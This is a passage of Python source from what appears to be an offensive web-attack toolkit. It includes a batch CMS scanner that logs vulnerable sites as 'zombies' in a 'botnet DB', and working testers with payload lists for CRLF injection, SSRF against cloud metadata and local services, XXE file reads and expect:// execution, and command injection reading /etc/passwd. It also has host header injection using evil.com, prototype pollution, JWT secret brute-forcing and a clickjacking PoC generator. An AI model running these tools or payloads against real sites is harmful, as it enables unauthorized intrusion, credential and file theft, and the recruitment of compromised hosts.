            print(f"\n  {M}{'━' * 55}{RST}")
            print(f"  {M}[{i}/{len(targets)}]{RST} {W}{target_url}{RST}")
            if target_url in existing_urls:
                print(f"  {C}[~]{RST} Already in botnet DB — scanning for updates...")
            print(f"  {M}{'━' * 55}{RST}")

            try:
                findings = _cms_scan_single(target_url, batch_mode=True)
            except Exception as e:
                print_err(f"Scan failed for {target_url}: {e}")
                findings = []
            n = len(findings) if findings else 0
            total_findings += n
            if n > 0:
                vuln_count += 1

            # Free memory between batch iterations
            del findings
            gc.collect()

            # Jitter between targets in batch mode
            if i < len(targets):
                wait = random.uniform(2.0, 5.0)
                print(f"\n  {C}Waiting {wait:.1f}s before next target...{RST}")
                time.sleep(wait)

        # ── Batch summary ──
        print(f"\n\n  {Y}{'═' * 55}{RST}")
        print(f"  {Y}  BATCH SCAN COMPLETE{RST}")
        print(f"  {Y}{'═' * 55}{RST}")
        print_row("Targets scanned", str(len(targets)))
        print_row("With findings", str(vuln_count))
        print_row("Total findings", str(total_findings))

        # Show updated DB count
        updated_db = _botnet_db_load()
        new_zombies = len(updated_db) - len(existing_db)
        if new_zombies > 0:
            print_row("New zombies added", f"{new_zombies}")
        print(f"  {Y}{'═' * 55}{RST}")
        return

    # ── Single target mode (default) ──
    url = prompt("Target URL (e.g. https://target.com)")
    if not url:
        return
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    url = url.rstrip("/")

    _cms_scan_single(url, batch_mode=False)


# ─── 40. Payload Encoder / Decoder ───────────────────────────────────────────

def payload_encoder():
    print_header("Payload Encoder / Decoder")

    print(f"""
  {Y}Encoding modes:{RST}
    {C}1.{RST} URL Encode
    {C}2.{RST} URL Decode
    {C}3.{RST} Base64 Encode
    {C}4.{RST} Base64 Decode
    {C}5.{RST} Hex Encode
    {C}6.{RST} Hex Decode
    {C}7.{RST} HTML Entity Encode
    {C}8.{RST} HTML Entity Decode
    {C}9.{RST} Unicode Escape
    {C}10.{RST} Double URL Encode
    {C}11.{RST} Hash (MD5/SHA1/SHA256)
    """)

    mode = input(f"  {Y}Select mode (1-11):{RST} ").strip()
    text = prompt("Input text")
    if not text:
        return

    import base64
    import urllib.parse
    import html

    result = ""
    label = ""

    if mode == "1":
        result = urllib.parse.quote(text, safe="")
        label = "URL Encoded"
    elif mode == "2":
        result = urllib.parse.unquote(text)
        label = "URL Decoded"
    elif mode == "3":
        result = base64.b64encode(text.encode()).decode()
        label = "Base64 Encoded"
    elif mode == "4":
        try:
            result = base64.b64decode(text).decode(errors="replace")
            label = "Base64 Decoded"
        except Exception:
            print_err("Invalid Base64 input")
            return
    elif mode == "5":
        result = text.encode().hex()
        label = "Hex Encoded"
    elif mode == "6":
        try:
            result = bytes.fromhex(text).decode(errors="replace")
            label = "Hex Decoded"
        except Exception:
            print_err("Invalid hex input")
            return
    elif mode == "7":
        result = html.escape(text)
        label = "HTML Encoded"
    elif mode == "8":
        result = html.unescape(text)
        label = "HTML Decoded"
    elif mode == "9":
        result = "".join(f"\\u{ord(c):04x}" for c in text)
        label = "Unicode Escaped"
    elif mode == "10":
        result = urllib.parse.quote(urllib.parse.quote(text, safe=""), safe="")
        label = "Double URL Encoded"
    elif mode == "11":
        data = text.encode()
        print(f"\n  {Y}Hashes:{RST}")
        print_row("MD5", hashlib.md5(data).hexdigest())
        print_row("SHA-1", hashlib.sha1(data).hexdigest())
        print_row("SHA-256", hashlib.sha256(data).hexdigest())
        print_row("SHA-512", hashlib.sha512(data).hexdigest())
        return
    else:
        print_err("Invalid mode")
        return

    print(f"\n  {Y}{label}:{RST}")
    print(f"  {G}{result}{RST}")


# ─── 51. CRLF Injection Tester ────────────────────────────────────────────────

CRLF_PAYLOADS = [
    ("%0d%0aInjected-Header:true", "URL-encoded CRLF"),
    ("%0d%0a%0d%0a<html>INJECTED</html>", "HTTP response splitting"),
    ("%0AInjected-Header:true", "LF only"),
    ("%0DInjected-Header:true", "CR only"),
    ("%E5%98%8A%E5%98%8DInjected-Header:true", "Unicode CRLF bypass"),
    ("%23%0d%0aInjected-Header:true", "Hash + CRLF"),
    ("%3F%0d%0aInjected-Header:true", "Question mark + CRLF"),
    ("\\r\\nInjected-Header:true", "Literal backslash CRLF"),
    ("%0d%0aSet-Cookie:crlf=injected", "Cookie injection via CRLF"),
    ("%0d%0aLocation:https://evil.com", "Redirect via CRLF"),
]


def crlf_injection():
    print_header("CRLF Injection Tester")
    if not exploit_disclaimer():
        return

    url = prompt("Target URL with parameter (e.g. http://target.com/page?url=value)")
    if not url:
        return

    parsed = urlparse(url)
    if "=" not in parsed.query:
        print_err("URL must contain a query parameter")
        return

    params = parsed.query.split("&")
    print(f"\n  {Y}Parameters found:{RST}")
    for i, p in enumerate(params):
        print(f"    {C}{i+1}.{RST} {p}")

    param_idx = input(f"\n  {Y}Select parameter (1-{len(params)}):{RST} ").strip()
    try:
        idx = int(param_idx) - 1
        if not (0 <= idx < len(params)):
            print_err("Invalid selection")
            return
    except ValueError:
        print_err("Invalid input")
        return

    param_name = params[idx].split("=")[0]
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    print(f"\n  {Y}Testing {len(CRLF_PAYLOADS)} CRLF payloads on '{param_name}'...{RST}\n")
    found = 0

    for payload, desc in CRLF_PAYLOADS:
        test_params = params.copy()
        test_params[idx] = f"{param_name}={payload}"
        test_url = f"{base_url}?{'&'.join(test_params)}"
        try:
            resp = requests.get(test_url, timeout=8, allow_redirects=False)
            if "injected-header" in str(resp.headers).lower() or "Injected-Header" in resp.headers:
                print(f"    {R}[VULN]{RST} {desc}")
                print(f"           Header injected successfully!")
                found += 1
            elif "crlf=injected" in str(resp.headers.get("Set-Cookie", "")):
                print(f"    {R}[VULN]{RST} {desc}")
                print(f"           Cookie injection via CRLF!")
                found += 1
            else:
                print(f"    {W}[SAFE]{RST} {desc}")
        except Exception:
            print(f"    {Y}[ERR]{RST}  {desc}")

    if found:
        print(f"\n  {R}VULNERABLE: {found} CRLF injection(s) found!{RST}")
    else:
        print(f"\n  {G}No CRLF injection vulnerabilities detected{RST}")


# ─── 52. SSRF Tester ─────────────────────────────────────────────────────────

SSRF_PAYLOADS = [
    ("http://127.0.0.1", "Localhost IPv4"),
    ("http://localhost", "Localhost hostname"),
    ("http://[::1]", "Localhost IPv6"),
    ("http://0.0.0.0", "All interfaces"),
    ("http://0177.0.0.1", "Octal localhost"),
    ("http://0x7f000001", "Hex localhost"),
    ("http://2130706433", "Decimal localhost"),
    ("http://127.1", "Short localhost"),
    ("http://169.254.169.254", "AWS metadata"),
    ("http://169.254.169.254/latest/meta-data/", "AWS metadata path"),
    ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"),
    ("http://169.254.169.254/metadata/v1/", "Azure metadata"),
    ("http://100.100.100.200/latest/meta-data/", "Alibaba metadata"),
    ("dict://127.0.0.1:6379/INFO", "Redis via dict://"),
    ("gopher://127.0.0.1:6379/_INFO", "Redis via gopher://"),
    ("file:///etc/passwd", "Local file read"),
    ("http://[0:0:0:0:0:ffff:127.0.0.1]", "IPv6 mapped IPv4"),
    ("http://127.0.0.1:80", "Localhost port 80"),
    ("http://127.0.0.1:22", "Localhost SSH"),
    ("http://127.0.0.1:3306", "Localhost MySQL"),
]


def ssrf_tester():
    print_header("SSRF Tester")
    if not exploit_disclaimer():
        return

    url = prompt("Target URL with parameter (e.g. http://target.com/fetch?url=value)")
    if not url:
        return

    parsed = urlparse(url)
    if "=" not in parsed.query:
        print_err("URL must contain a query parameter")
        return

    params = parsed.query.split("&")
    print(f"\n  {Y}Parameters found:{RST}")
    for i, p in enumerate(params):
        print(f"    {C}{i+1}.{RST} {p}")

    param_idx = input(f"\n  {Y}Select parameter to test (1-{len(params)}):{RST} ").strip()
    try:
        idx = int(param_idx) - 1
        if not (0 <= idx < len(params)):
            print_err("Invalid selection")
            return
    except ValueError:
        print_err("Invalid input")
        return

    param_name = params[idx].split("=")[0]
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    # Baseline
    try:
        baseline = requests.get(url, timeout=10)
        baseline_len = len(baseline.text)
        baseline_code = baseline.status_code
    except Exception:
        baseline_len = 0
        baseline_code = 0

    print(f"\n  {Y}Testing {len(SSRF_PAYLOADS)} SSRF payloads...{RST}")
    print(f"  {W}Baseline: HTTP {baseline_code}, {baseline_len} bytes{RST}\n")

    found = 0
    for payload, desc in SSRF_PAYLOADS:
        import urllib.parse as _up
        test_params = params.copy()
        test_params[idx] = f"{param_name}={_up.quote(payload, safe='')}"
        test_url = f"{base_url}?{'&'.join(test_params)}"
        try:
            resp = requests.get(test_url, timeout=10, allow_redirects=False)
            diff = abs(len(resp.text) - baseline_len)
            indicators = ["root:", "ami-id", "instance-id", "computeMetadata",
                          "127.0.0.1", "localhost", "redis_version", "private"]
            hit = any(ind in resp.text for ind in indicators)
            if hit:
                print(f"    {R}[VULN]{RST} {desc}")
                print(f"           Sensitive content detected in response!")
                found += 1
            elif diff > 200 and resp.status_code != baseline_code:
                print(f"    {Y}[SUSP]{RST} {desc} (HTTP {resp.status_code}, diff={diff})")
                found += 1
            else:
                print(f"    {W}[SAFE]{RST} {desc}")
        except Exception:
            print(f"    {Y}[ERR]{RST}  {desc}")

    if found:
        print(f"\n  {R}Potential SSRF: {found} suspicious response(s)!{RST}")
    else:
        print(f"\n  {G}No SSRF indicators detected{RST}")


# ─── 53. JWT Analyzer ────────────────────────────────────────────────────────

def jwt_analyzer():
    print_header("JWT Analyzer")
    token = prompt("JWT Token")
    if not token:
        return

    import base64

    parts = token.split(".")
    if len(parts) != 3:
        print_err("Invalid JWT format (expected 3 parts separated by dots)")
        return

    def b64_decode(data):
        padding = 4 - len(data) % 4
        if padding != 4:
            data += "=" * padding
        return base64.urlsafe_b64decode(data)

    # Decode header
    try:
        header = json.loads(b64_decode(parts[0]))
        print(f"\n  {Y}── Header ──{RST}")
        for k, v in header.items():
            print_row(k, str(v))
    except Exception as e:
        print_err(f"Failed to decode header: {e}")
        return

    # Decode payload
    try:
        payload = json.loads(b64_decode(parts[1]))
        print(f"\n  {Y}── Payload ──{RST}")
        for k, v in payload.items():
            if k in ("iat", "exp", "nbf") and isinstance(v, (int, float)):
                import datetime
                ts = datetime.datetime.utcfromtimestamp(v).strftime("%Y-%m-%d %H:%M:%S UTC")
                print_row(k, f"{v} ({ts})")
                if k == "exp" and v < time.time():
                    print(f"    {R}⚠ Token is EXPIRED!{RST}")
            else:
                print_row(k, str(v))
    except Exception as e:
        print_err(f"Failed to decode payload: {e}")
        return

    # Signature info
    print(f"\n  {Y}── Signature ──{RST}")
    alg = header.get("alg", "unknown")
    print_row("Algorithm", alg)

    # Security checks
    print(f"\n  {Y}── Security Analysis ──{RST}")
    if alg.lower() == "none":
        print(f"  {R}[CRITICAL] Algorithm is 'none' – signature not verified!{RST}")
    if alg.upper() in ("HS256", "HS384", "HS512"):
        print_warn(f"HMAC algorithm ({alg}) – vulnerable to secret brute-force")
        brute = input(f"\n  {Y}Brute-force weak secrets? (y/n):{RST} ").strip().lower()
        if brute in ("y", "yes", "s", "si"):
            import hmac as _hmac
            common_secrets = [
                "secret", "password", "123456", "admin", "key", "jwt_secret",
                "changeme", "test", "default", "private", "supersecret",
                "mysecret", "mykey", "token", "auth", "development", "staging",
                "production", "qwerty", "letmein", "welcome", "abc123",
            ]
            spinner("Testing common secrets...", 0.5)
            sign_input = f"{parts[0]}.{parts[1]}".encode()
            target_sig = b64_decode(parts[2])
            hash_func = {"HS256": "sha256", "HS384": "sha384", "HS512": "sha512"}.get(alg.upper(), "sha256")
            for secret in common_secrets:
                sig = _hmac.new(secret.encode(), sign_input, hash_func).digest()
                if sig == target_sig:
                    print(f"\n  {R}[CRITICAL] Secret found: '{secret}'{RST}")
                    print(f"  {R}Token can be forged with this secret!{RST}")
                    break
            else:
                print_ok("No common secret matched")

    if header.get("kid"):
        print_warn(f"'kid' parameter present ({header['kid']}) – check for injection")
    if header.get("jku"):
        print_warn(f"'jku' parameter present ({header['jku']}) – SSRF risk")
    if header.get("x5u"):
        print_warn(f"'x5u' parameter present ({header['x5u']}) – SSRF risk")


# ─── 54. Clickjacking Tester ─────────────────────────────────────────────────

def clickjacking_test():
    print_header("Clickjacking Tester")
    if not exploit_disclaimer():
        return

    target = prompt("Target URL")
    if not target:
        return

    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    spinner("Checking frame protection...", 1.0)

    try:
        resp = requests.get(target, timeout=10)
    except Exception as e:
        print_err(f"Error: {e}")
        return

    xfo = resp.headers.get("X-Frame-Options", "")
    csp = resp.headers.get("Content-Security-Policy", "")
    vulnerable = True

    print(f"\n  {Y}── X-Frame-Options ──{RST}")
    if xfo:
        print_row("Value", xfo)
        if xfo.upper() in ("DENY", "SAMEORIGIN"):
            print_ok("Properly configured")
            vulnerable = False
        elif "ALLOW-FROM" in xfo.upper():
            print_warn(f"ALLOW-FROM is deprecated and ignored by modern browsers")
    else:
        print_warn("X-Frame-Options header NOT SET")

    print(f"\n  {Y}── CSP frame-ancestors ──{RST}")
    if "frame-ancestors" in csp:
        fa = re.search(r"frame-ancestors\s+([^;]+)", csp)
        if fa:
            value = fa.group(1).strip()
            print_row("Value", value)
            if "'none'" in value or "'self'" in value:
                print_ok("frame-ancestors properly restricts framing")
                vulnerable = False
    else:
        print_warn("CSP frame-ancestors directive NOT SET")

    if vulnerable:
        print(f"\n  {R}[VULNERABLE] Target may be vulnerable to clickjacking!{RST}")
        print(f"\n  {Y}Proof-of-Concept HTML:{RST}")
        poc = f'''  <html>
    <head><title>Clickjacking PoC</title></head>
    <body>
      <h1>Clickjacking PoC</h1>
      <iframe src="{target}" width="800" height="600"
              style="opacity:0.3;position:absolute;top:50px;left:50px;">
      </iframe>
      <button style="position:absolute;top:200px;left:200px;z-index:-1;">
        Click me!
      </button>
    </body>
  </html>'''
        print(f"  {W}{poc}{RST}")
    else:
        print(f"\n  {G}Target appears protected against clickjacking{RST}")


# ─── 55. XXE Tester ──────────────────────────────────────────────────────────

XXE_PAYLOADS = [
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
     "Classic file read (Linux)"),
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
     "Classic file read (Windows)"),
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1">]><foo>&xxe;</foo>',
     "SSRF via XXE"),
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://127.0.0.1"> %xxe;]><foo>test</foo>',
     "Parameter entity SSRF"),
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
     "PHP expect:// RCE"),
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
     "PHP filter wrapper"),
]


def xxe_tester():
    print_header("XXE (XML External Entity) Tester")
    if not exploit_disclaimer():
        return

    url = prompt("Target URL (accepts XML input)")
    if not url:
        return

    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    print(f"\n  {Y}Testing {len(XXE_PAYLOADS)} XXE payloads...{RST}\n")
    found = 0

    # Baseline
    try:
        baseline = requests.post(url, data="<test>hello</test>",
                                 headers={"Content-Type": "application/xml"}, timeout=10)
        baseline_len = len(baseline.text)
    except Exception:
        baseline_len = 0

    for payload, desc in XXE_PAYLOADS:
        try:
            resp = requests.post(url, data=payload,
                                 headers={"Content-Type": "application/xml"}, timeout=10)
            indicators = ["root:", "[fonts]", "uid=", "gid=", "127.0.0.1"]
            hit = any(ind in resp.text for ind in indicators)
            diff = abs(len(resp.text) - baseline_len)
            if hit:
                print(f"    {R}[VULN]{RST} {desc}")
                print(f"           Sensitive content in response!")
                found += 1
            elif diff > 200:
                print(f"    {Y}[SUSP]{RST} {desc} (response diff: {diff} bytes)")
            else:
                print(f"    {W}[SAFE]{RST} {desc}")
        except Exception:
            print(f"    {Y}[ERR]{RST}  {desc}")

    if found:
        print(f"\n  {R}XXE VULNERABLE: {found} payload(s) succeeded!{RST}")
    else:
        print(f"\n  {G}No XXE vulnerabilities detected{RST}")


# ─── 56. Command Injection Tester ────────────────────────────────────────────

CMDI_PAYLOADS = [
    ("; id", "Semicolon + id"),
    ("| id", "Pipe + id"),
    ("|| id", "OR + id"),
    ("& id", "Background + id"),
    ("&& id", "AND + id"),
    ("`id`", "Backtick injection"),
    ("$(id)", "Command substitution"),
    ("; cat /etc/passwd", "Semicolon + passwd"),
    ("| cat /etc/passwd", "Pipe + passwd"),
    ("; sleep 5", "Time-based (5s sleep)"),
    ("| sleep 5", "Time-based pipe sleep"),
    ("|| sleep 5", "Time-based OR sleep"),
    ("; ping -c 3 127.0.0.1", "Ping test"),
    ("| ping -c 3 127.0.0.1", "Pipe ping test"),
    ("%0a id", "Newline + id"),
    ("'; id; '", "Quote break + id"),
    ("\"; id; \"", "Double quote break + id"),
    ("{${id}}", "Bash brace expansion"),
    ("; echo ARGUS_CMDI_TEST", "Echo marker"),
    ("| echo ARGUS_CMDI_TEST", "Pipe echo marker"),
]


def cmd_injection():
    print_header("Command Injection Tester")
    if not exploit_disclaimer():
        return

    url = prompt("Target URL with parameter (e.g. http://target.com/ping?host=value)")
    if not url:
        return

    parsed = urlparse(url)
    if "=" not in parsed.query:
        print_err("URL must contain a query parameter")
        return

    params = parsed.query.split("&")
    print(f"\n  {Y}Parameters found:{RST}")
    for i, p in enumerate(params):
        print(f"    {C}{i+1}.{RST} {p}")

    param_idx = input(f"\n  {Y}Select parameter (1-{len(params)}):{RST} ").strip()
    try:
        idx = int(param_idx) - 1
        if not (0 <= idx < len(params)):
            print_err("Invalid selection")
            return
    except ValueError:
        print_err("Invalid input")
        return

    param_name = params[idx].split("=")[0]
    original_value = params[idx].split("=")[1] if "=" in params[idx] else ""
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    print(f"\n  {Y}Testing {len(CMDI_PAYLOADS)} command injection payloads...{RST}\n")
    found = 0

    for payload, desc in CMDI_PAYLOADS:
        import urllib.parse as _up
        test_params = params.copy()
        test_params[idx] = f"{param_name}={_up.quote(original_value + payload, safe='')}"
        test_url = f"{base_url}?{'&'.join(test_params)}"
        try:
            start_t = time.time()
            resp = requests.get(test_url, timeout=12)
            elapsed = time.time() - start_t

            indicators = ["uid=", "gid=", "root:", "ARGUS_CMDI_TEST",
                          "bin/", "sbin/", "bytes from 127.0.0.1"]
            hit = any(ind in resp.text for ind in indicators)
            time_based = "sleep" in payload and elapsed > 4.5

            if hit:
                print(f"    {R}[VULN]{RST} {desc}")
                print(f"           Command output detected in response!")
                found += 1
            elif time_based:
                print(f"    {R}[VULN]{RST} {desc}")
                print(f"           Time-based: response took {elapsed:.1f}s (expected ~5s)")
                found += 1
            else:
                print(f"    {W}[SAFE]{RST} {desc}")
        except Exception:
            print(f"    {Y}[ERR]{RST}  {desc}")

    if found:
        print(f"\n  {R}COMMAND INJECTION FOUND: {found} payload(s) succeeded!{RST}")
    else:
        print(f"\n  {G}No command injection detected{RST}")


# ─── 57. Host Header Injection ───────────────────────────────────────────────

def host_header_injection():
    print_header("Host Header Injection Tester")
    if not exploit_disclaimer():
        return

    target = prompt("Target URL")
    if not target:
        return

    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    spinner("Testing host header manipulation...", 1.0)

    parsed = urlparse(target)
    original_host = parsed.netloc
    evil = "evil.com"

    tests = [
        ("Arbitrary Host", {"Host": evil}),
        ("X-Forwarded-Host", {"X-Forwarded-Host": evil}),
        ("X-Host", {"X-Host": evil}),
        ("X-Original-URL", {"X-Original-URL": "/admin"}),
        ("X-Rewrite-URL", {"X-Rewrite-URL": "/admin"}),
        ("X-Forwarded-Server", {"X-Forwarded-Server": evil}),
        ("X-Forwarded-For", {"X-Forwarded-For": "127.0.0.1"}),
        ("Forwarded", {"Forwarded": f"host={evil}"}),
        ("Host with port", {"Host": f"{original_host}:{evil}"}),
        ("Double Host", {"Host": original_host, "X-Forwarded-Host": evil}),
    ]

    try:
        baseline = requests.get(target, timeout=10)
        baseline_len = len(baseline.text)
    except Exception as e:
        print_err(f"Error: {e}")
        return

    print(f"\n  {Y}Testing {len(tests)} host header payloads...{RST}\n")
    found = 0

    for desc, headers in tests:
        try:
            resp = requests.get(target, headers=headers, timeout=10, allow_redirects=False)
            diff = abs(len(resp.text) - baseline_len)
            has_evil = evil in resp.text or evil in str(resp.headers)
            redirected = resp.status_code in (301, 302, 303, 307, 308) and evil in resp.headers.get("Location", "")

            if redirected:
                print(f"    {R}[VULN]{RST} {desc}")
                print(f"           Redirect to evil host: {resp.headers.get('Location', '')}")
                found += 1
            elif has_evil:
                print(f"    {R}[VULN]{RST} {desc}")
                print(f"           Evil host reflected in response!")
                found += 1
            elif diff > 500:
                print(f"    {Y}[SUSP]{RST} {desc} (response diff: {diff} bytes)")
            else:
                print(f"    {W}[SAFE]{RST} {desc}")
        except Exception:
            print(f"    {Y}[ERR]{RST}  {desc}")

    if found:
        print(f"\n  {R}HOST HEADER INJECTION: {found} vector(s) found!{RST}")
    else:
        print(f"\n  {G}No host header injection detected{RST}")


# ─── 58. Insecure Cookie Checker ─────────────────────────────────────────────

def cookie_checker():
    print_header("Insecure Cookie Checker")
    target = prompt("Target URL")
    if not target:
        return

    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    spinner("Fetching cookies...", 1.0)

    try:
        resp = requests.get(target, timeout=10)
    except Exception as e:
        print_err(f"Error: {e}")
        return

    set_cookies = resp.headers.get("Set-Cookie", "")
    if not set_cookies and not resp.cookies:
        print_warn("No cookies set by this page")
        return

    # Parse all Set-Cookie headers
    raw_cookies = resp.raw.headers.getlist("Set-Cookie") if hasattr(resp.raw.headers, "getlist") else [set_cookies]
    if not raw_cookies or raw_cookies == ['']:
        raw_cookies = []
        for key, val in resp.headers.items():
            if key.lower() == "set-cookie":
                raw_cookies.append(val)

    if not raw_cookies or raw_cookies == ['']:
        # Fallback to cookies jar
        if resp.cookies:
            for name, value in resp.cookies.items():
                print(f"\n  {Y}Cookie: {W}{name}{RST}")
                print_row("Value", value[:50] + ("..." if len(value) > 50 else ""))
                print_warn("Cannot analyze flags (raw headers not available)")
        else:
            print_warn("No cookies found")
        return

    issues = 0
    for raw in raw_cookies:
        if not raw.strip():
            continue
        parts = [p.strip() for p in raw.split(";")]
        name_val = parts[0]
        name = name_val.split("=")[0] if "=" in name_val else name_val
        flags = " ".join(parts[1:]).lower()

        print(f"\n  {Y}Cookie: {W}{name}{RST}")
        print_row("Raw", raw[:80] + ("..." if len(raw) > 80 else ""))

        # Check Secure flag
        if "secure" in flags:
            print(f"    {G}✓{RST} Secure flag set")
        else:
            print(f"    {R}✗{RST} Secure flag MISSING (sent over HTTP)")
            issues += 1

        # Check HttpOnly flag
        if "httponly" in flags:
            print(f"    {G}✓{RST} HttpOnly flag set")
        else:
            print(f"    {R}✗{RST} HttpOnly flag MISSING (accessible via JS)")
            issues += 1

        # Check SameSite
        if "samesite=strict" in flags:
            print(f"    {G}✓{RST} SameSite=Strict")
        elif "samesite=lax" in flags:
            print(f"    {Y}~{RST} SameSite=Lax (partial protection)")
        elif "samesite=none" in flags:
            print(f"    {R}✗{RST} SameSite=None (cross-site requests allowed)")
            issues += 1
        else:
            print(f"    {Y}~{RST} SameSite not set (defaults to Lax in modern browsers)")

        # Check for sensitive naming
        sensitive_names = ["session", "sess", "token", "auth", "jwt", "sid", "csrf"]
        if any(s in name.lower() for s in sensitive_names):
            if "secure" not in flags or "httponly" not in flags:
                print(f"    {R}⚠{RST} Sensitive cookie without full protection!")
                issues += 1

    if issues:
        print(f"\n  {R}Total security issues: {issues}{RST}")
    else:
        print(f"\n  {G}All cookies appear properly secured{RST}")


# ─── 59. CSRF Token Analyzer ─────────────────────────────────────────────────

def csrf_analyzer():
    print_header("CSRF Token Analyzer")
    if not exploit_disclaimer():
        return

    target = prompt("Target URL (page with forms)")
    if not target:
        return

    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    if BeautifulSoup is None:
        print_err("beautifulsoup4 required: pip install beautifulsoup4")
        return

    spinner("Analyzing forms for CSRF protection...", 1.0)

    try:
        session = requests.Session()
        resp = session.get(target, timeout=10)
    except Exception as e:
        print_err(f"Error: {e}")
        return

    soup = BeautifulSoup(resp.text, "html.parser")
    forms = soup.find_all("form")

    if not forms:
        print_warn("No forms found on this page")
        return

    print_row("Forms Found", str(len(forms)))
    vulnerable_forms = 0

    for i, form in enumerate(forms, 1):
        action = form.get("action", "(none)")
        method = form.get("method", "GET").upper()
        print(f"\n  {Y}── Form #{i} ──{RST}")
        print_row("Action", action)
        print_row("Method", method)

        # Check for CSRF tokens
        csrf_names = ["csrf", "token", "_token", "csrfmiddlewaretoken", "authenticity_token",
                      "__RequestVerificationToken", "antiforgery", "nonce", "__csrf"]
        inputs = form.find_all("input", {"type": "hidden"})
        csrf_found = False
        for inp in inputs:
            name = inp.get("name", "").lower()
            if any(c in name for c in csrf_names):
                csrf_found = True
                print(f"    {G}✓{RST} CSRF token: {inp.get('name')} = {inp.get('value', '')[:30]}...")
                # Check token quality
                val = inp.get("value", "")
                if len(val) < 16:
                    print(f"    {Y}⚠{RST} Token seems short ({len(val)} chars)")
                if val.isdigit():
                    print(f"    {R}⚠{RST} Token is numeric only – weak!")

        # Check for meta CSRF tags
        metas = soup.find_all("meta", attrs={"name": re.compile(r"csrf|token", re.I)})
        for meta in metas:
            csrf_found = True
            print(f"    {G}✓{RST} Meta CSRF: {meta.get('name')} = {meta.get('content', '')[:30]}...")

        if not csrf_found and method == "POST":
            print(f"    {R}✗{RST} No CSRF token detected on POST form!")
            vulnerable_forms += 1
        elif not csrf_found and method == "GET":
            print(f"    {Y}~{RST} GET form (CSRF less critical but check state changes)")

        # Check SameSite cookies
        for cookie_name, cookie_value in session.cookies.items():
            if "session" in cookie_name.lower() or "csrf" in cookie_name.lower():
                print(f"    {C}Cookie:{RST} {cookie_name}")

    # Check headers
    print(f"\n  {Y}── Response Headers ──{RST}")
    origin_check = resp.headers.get("Access-Control-Allow-Origin", "")
    if origin_check == "*":
        print(f"  {R}⚠{RST} CORS allows all origins (*) – CSRF risk!")
    elif origin_check:
        print_row("CORS Origin", origin_check)

    if vulnerable_forms:
        print(f"\n  {R}CSRF VULNERABLE: {vulnerable_forms} form(s) without protection!{RST}")
    else:
        print(f"\n  {G}All POST forms appear to have CSRF protection{RST}")


# ─── 60. Prototype Pollution Scanner ─────────────────────────────────────────

PROTO_PAYLOADS = [
    ("__proto__[polluted]=true", "Classic __proto__"),
    ("__proto__.polluted=true", "Dot notation __proto__"),
    ("constructor[prototype][polluted]=true", "Constructor.prototype"),
    ("constructor.prototype.polluted=true", "Constructor dot notation"),
    ("__proto__[status]=510", "Status code pollution"),
    ("__proto__[headers][x-polluted]=true", "Header pollution"),
    ("__proto__[admin]=true", "Privilege escalation"),
    ("__proto__[isAdmin]=1", "Admin flag pollution"),
]


def prototype_pollution():
    print_header("Prototype Pollution Scanner")
    if not exploit_disclaimer():
        return

    url = prompt("Target URL")
    if not url:
        return

    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    spinner("Testing prototype pollution vectors...", 1.0)

    # Baseline
    try:
        baseline = requests.get(url, timeout=10)
        baseline_len = len(baseline.text)
        baseline_code = baseline.status_code
    except Exception as e:
        print_err(f"Error: {e}")
        return

    print(f"\n  {Y}Testing via query parameters...{RST}\n")
    found = 0
    sep = "&" if "?" in url else "?"

    for payload, desc in PROTO_PAYLOADS:
        test_url = f"{url}{sep}{payload}"
        try:
            resp = requests.get(test_url, timeout=10)
            diff = abs(len(resp.text) - baseline_len)
            code_diff = resp.status_code != baseline_code

            if resp.status_code == 510 and "status" in payload:
                print(f"    {R}[VULN]{RST} {desc}")
                print(f"           Status code changed to 510!")
                found += 1
            elif "x-polluted" in str(resp.headers).lower():
                print(f"    {R}[VULN]{RST} {desc}")
                print(f"           Custom header injected!")
                found += 1
            elif code_diff and diff > 100:
                print(f"    {Y}[SUSP]{RST} {desc} (HTTP {resp.status_code}, diff={diff})")
            else:
                print(f"    {W}[SAFE]{RST} {desc}")
        except Exception:
            print(f"    {Y}[ERR]{RST}  {desc}")

    # Test via JSON body
    print(f"\n  {Y}Testing via JSON body...{RST}\n")
    json_payloads = [
        ({"__proto__": {"polluted": True}}, "JSON __proto__"),
        ({"constructor": {"prototype": {"polluted": True}}}, "JSON constructor.prototype"),
    ]
    for payload, desc in json_payloads:
        try:
            resp = requests.post(url, json=payload, timeout=10)
            diff = abs(len(resp.text) - baseline_len)
            if resp.status_code != baseline_code or diff > 200:
                print(f"    {Y}[SUSP]{RST} {desc} (HTTP {resp.status_code}, diff={diff})")
            else:
                print(f"    {W}[SAFE]{RST} {desc}")
        except Exception:
            print(f"    {Y}[ERR]{RST}  {desc}")

    if found:
        print(f"\n  {R}PROTOTYPE POLLUTION: {found} vector(s) confirmed!{RST}")
    else:
        print(f"\n  {G}No prototype pollution detected (server-side may still be vulnerable){RST}")


# ─── 51. WP Plugin & Theme Enumerator ────────────────────────────────────────

WP_COMMON_PLUGINS = [
    "akismet", "contact-form-7", "wordpress-seo", "woocommerce", "jetpack",
    "wordfence", "elementor", "classic-editor", "wpforms-lite", "all-in-one-seo-pack",
    "google-sitemap-generator", "really-simple-ssl", "wp-super-cache", "w3-total-cache",
    "updraftplus", "duplicate-post", "tinymce-advanced", "regenerate-thumbnails",
